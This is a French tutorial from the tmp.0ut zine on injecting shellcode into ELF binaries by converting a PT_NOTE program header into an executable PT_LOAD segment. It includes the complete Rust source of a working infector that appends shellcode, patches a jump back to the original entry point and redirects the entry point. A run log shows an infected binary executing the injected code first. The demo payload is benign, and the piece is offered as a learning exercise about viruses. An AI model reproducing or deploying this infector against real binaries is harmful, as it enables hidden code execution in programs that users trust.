   \_______________________________________________________________________/
o_/_________________________________________________________________________\_o
   | |          ___________                              __              | |
   | |          \__    ___/____ ______      ____  __ ___/  |_            | |
   | |            |    | /     \\____ \    /  _ \|  |  \   __\           | |
   | |            |    ||  Y Y  \  |_> >  (  <_> )  |  /|  |             | |
   | |            |____||__|_|  /   __/ /\ \____/|____/ |__|             | |
   | |                        \/|__|    \/                               | |
   | |                                                                   | |
   | |         ::: Injecteur ELF PT_NOTE à PT_LOAD (en Rust) :::         | |
   | |              `- avec amour par d3npa et tmp.0ut <3                | |
   | |                                                                   | |

+------------------------------------------------------------------------------
| Une version japonaise et disponible sur Github
| 日本語版はGithubにてご覧できます
| https://github.com/d3npa/hacking-trix-rust/blob/main/elf/ptnote-infector
+------------------------------------------------------------------------------

J'ai lu sur le blog de SymbolCrash une technique permettant d'injecter un shellcode dans un binaire ELF en convertissant une en-tête de programme PT_NOTE en en-tête PT_LOAD. J'ai pensé que cela semblait intéressant et ne connaissant pas beaucoup ELF, j'ai saisi l'occasion d'apprendre de nouvelles choses.

Pour ce projet, j'ai créé une petite bibliothèque, très incomplète, appelée mental_elf, qui facilite l'analyse et l'écriture des métadonnées ELF. Je pense que le code de la bibliothèque est simple et facile à comprendre, donc je n'en parlerai pas plus ici. 

====[ présentation ]===========================================================

Comme son nom l'indique, cette technique d'infection consiste à convertir l'en-tête de programme `PT_NOTE` d'un fichier ELF en une en-tête `PT_LOAD` afin d'exécuter un shellcode. 
L'infection se résume à trois étapes :

    - Ajouter le shellcode à la fin du fichier ELF.
    - Charger le shellcode à une adresse spécifique en mémoire virtuelle 
    - Modifier le point d'entrée du fichier ELF à l'adresse ci-dessus afin que le shellcode soit exécuté en premier.

Le shellcode doit également être corrigé pour chaque fichier ELF afin de retourner au point d'entrée original du fichier ELF hôte, permettant ainsi à l'hôte de s'exécuter normalement une fois le shellcode terminé.

Le shellcode peut être chargé en mémoire virtuelle via un en-tête PT_LOAD. L'insertion d'un nouvel en-tête dans le fichier ELF casserait probablement de nombreux offset, mais il est généralement possible de réaffecter un en-tête PT_NOTE sans rien casser. 

Voici une note concernant la section Note de la spécification ELF :

    +--------------------------------------------------------------------------
    | Les informations Notes sont facultatives.  La présence d'informations note n'affecte pas la conformité d'un programme à l'ABI, sous condition que ces informations n'affectent pas l'exécution du programme. Sinon, le programme n'est pas conforme à l'ABI et a un comportement indéfini.
    +--------------------------------------------------------------------------

Voici deux limitations sur lesquelles je suis tombé :

    - Cette technique simpliste ne fonctionnera pas avec les PIE. 
    - Le runtime du langage Go attend une section PT_NOTE valide contenant des informations de version pour pouvoir fonctionner, donc cette technique ne peut pas être utilisée avec les binaires Go.

Note : PIE peut être désactivé dans cc avec `-no-pie` ou dans rustc avec `-C relocation-model=static`.

====[ shellcode ]==============================================================

Le shellcode fourni est écrit pour le Netwide ASseMbler (NASM). Assurez-vous d'installer `nasm` avant de lancer le Makefile !

Pour créer un shellcode approprié pour cette injection, il faut garder quelques choses à l'esprit. La section 3.4.1 de l'ABI AMD64 System V dit que les registres rbp, rsp, et rdx doivent être mis à des valeurs correctes avant l'entrée. Ceci peut être réalisé par des push et pop ordinaires autour du shellcode.

Mon shellcode ne touche ni rbp, ni rsp, et mettre rdx à zéro avant de revenir a également fonctionné.

Le shellcode doit aussi être patché pour pouvoir retourner au point d'entrée original de l'hôte après avoir terminé. Pour faciliter le patching, le shellcode peut être conçu pour s'exécuter à la fin du fichier, soit en étant écrit de haut en bas, soit en sautant vers un label vide à la fin :

    +--------------------------------------------------------------------------
    | main_tasks:
    |    ; ...
    |    jmp finish
    | other_tasks:
    |     ; ...
    | finish:
    +--------------------------------------------------------------------------

Avec ce design, patcher est aussi simple que d'ajouter un jump. Cependant en x86_64, jmp ne peut pas prendre un opérande 64bit - à la place, la destination est stockée dans rax et ensuite on fait un jmp rax. Cet extrait en rust patche un vecteur d'octet "shellcode" pour ajouter un saut à entry_point :

    +--------------------------------------------------------------------------
    | fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    |     // Store entry_point in rax
    |     shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
    |     shellcode.extend_from_slice(&entry_point.to_ne_bytes());
    |     // Jump to address in rax
    |     shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
    | }
    +--------------------------------------------------------------------------

====[ infecteur ]==============================================================

L'infecteur se trouve dans src/main.rs.
Il est écrit de haut en bas dans un format facile à suivre, donc si vous avez compris la présentation, il devrait être très clair. J'ai également ajouté des commentaires pour vous aider. Le code utilise ma bibliothèque mental_elf pour abstraire les détails de la lecture et de l'écriture du fichier, de sorte qu'il est plus facile de voir la technique.

En résumé, le code

- Prend 2 paramètres CLI : la cible ELF et un fichier shellcode.
- Lit les en-têtes ELF et de programme à partir du fichier ELF
- Corrige le shellcode avec un `jmp` vers le point d'entrée original.
- Ajoute le shellcode patché au fichier ELF
- Trouve un en-tête de programme `PT_NOTE` et le convertit en `PT_LOAD`.
- Modifie le point d'entrée du fichier ELF vers le début du shellcode.
- Sauvegarde les structures d'en-tête modifiées dans le fichier ELF.

Lorsqu'un fichier ELF infecté est exécuté, le chargeur ELF mappe plusieurs sections du fichier ELF dans la mémoire virtuelle - notre PT_LOAD assure que notre shellcode est chargé et exécutable. Le point d'entrée du fichier ELF commence alors l'exécution du shellcode. Une fois le shellcode terminé, il sautera au point d'entrée original, permettant au binaire d'exécuter son code original.

    +--------------------------------------------------------------------------
    | $ make
    | cd files && make && cd ..
    | make[1]: Entering directory '/.../files'
    | rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
    | nasm -o shellcode.o shellcode.s
    | make[1]: Leaving directory '/.../files'
    | cargo run --release files/target files/shellcode.o
    | Compiling mental_elf v0.1.0 
    (https://github.com/d3npa/mental-elf#0355d2d3)
    | Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
    |     Finished release [optimized] target(s) in 1.15s
    |     Running `target/release/ptnote-to-ptload-elf-injection files/target 
    files/shellcode.o`
    | Found PT_NOTE section; converting to PT_LOAD
    | echo 'Done! Run target with: `./files/target`'
    | Done! Run target with: `./files/target`
    | $ ./files/target
    | dont tell anyone im here
    | hello world!
    | $
    +--------------------------------------------------------------------------

====[ conclusion ]=============================================================

C'était un projet tellement amusant ! J'ai appris beaucoup sur Rust, ELF, et les virus en général. Merci à netspooky, sblip, TMZ et aux autres membres de tmp.out pour m'avoir enseigné, aidé à débuguer et motivé à réaliser ce projet. <3

Liens supplémentaires :
- https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
- http://www.skyfree.org/linux/references/ELF_Format.pdf
- https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf
- https://github.com/d3npa/mental-elf

Le code source est ci-dessous :

------------------------------------------------------------------------------
  Cargo.toml
------------------------------------------------------------------------------

[package]
...

[dependencies.mental_elf]
git = "https://github.com/d3npa/mental-elf"
rev = "0355d2d35558e092a038589fc8b98ac9bc70c37b"

------------------------------------------------------------------------------
  main.rs
------------------------------------------------------------------------------

use mental_elf::elf64::constants::*;
use std::{env, fs, process};
use std::io::prelude::*;
use std::io::SeekFrom;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <ELF File> <Shellcode File>", args[0]);
        process::exit(1);
    }

    let elf_path = &args[1];
    let sc_path = &args[2];

    // Open target ELF file with RW permissions
    let mut elf_fd = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&elf_path)?;

    // Load shellcode from file
    let mut shellcode: Vec<u8> = fs::read(&sc_path)?;

    // Parse ELF and program headers
    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
    let mut program_headers = mental_elf::read_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff, 
        elf_header.e_phnum,
    )?;

    // Patch the shellcode to jump to the original entry point after finishing
    patch_jump(&mut shellcode, elf_header.e_entry);

    // Append the shellcode to the very end of the target ELF
    elf_fd.seek(SeekFrom::End(0))?;
    elf_fd.write(&shellcode)?;

    // Calculate offsets used to patch the ELF and program headers
    let sc_len = shellcode.len() as u64;
    let file_offset = elf_fd.metadata()?.len() - sc_len;
    let memory_offset = 0xc00000000 + file_offset;

    // Look for a PT_NOTE section
    for phdr in &mut program_headers {
        if phdr.p_type == PT_NOTE {
            // Convert to a PT_LOAD section with values to load shellcode
            println!("Found PT_NOTE section; converting to PT_LOAD");
            phdr.p_type = PT_LOAD;
            phdr.p_flags = PF_R | PF_X;
            phdr.p_offset = file_offset;
            phdr.p_vaddr = memory_offset;
            phdr.p_memsz += sc_len as u64;
            phdr.p_filesz += sc_len as u64;
            // Patch the ELF header to start at the shellcode
            elf_header.e_entry = memory_offset;
            break;
        }
    }

    // Commit changes to the program and ELF headers
    mental_elf::write_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff,
        elf_header.e_phnum,
        program_headers,
    )?;
    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;

    Ok(())
}

fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    // Store entry_point in rax
    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
    // Jump to address in rax
    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
}

------------------------------------------------------------------------------
------------------------------------------------------------------------------

